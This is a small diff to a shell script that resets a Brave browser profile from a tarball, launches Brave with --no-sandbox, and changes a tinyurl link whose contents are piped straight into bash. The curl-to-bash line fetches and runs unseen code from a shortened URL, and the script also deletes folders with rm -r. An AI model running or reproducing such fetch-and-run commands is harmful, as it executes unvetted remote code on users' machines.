@@ -5,7 +5,7 @@ rm -r /.config/BraveSoftware/Brave-Browser
 tar -xf /brav.tar.gz
 cp -r /brav /.config/BraveSoftware/brav
 mv /.config/BraveSoftware/brav /.config/BraveSoftware/Brave-Browser
-curl -L "https://tinyurl.com/bravloop" |bash
+curl -L "https://tinyurl.com/bravloop1" |bash
 sleep 300
 /usr/bin/brave-browser --no-sandbox
 pkill brave; cp /.config/BraveSoftware/Brave-Browser /.config/BraveSoftware/brav
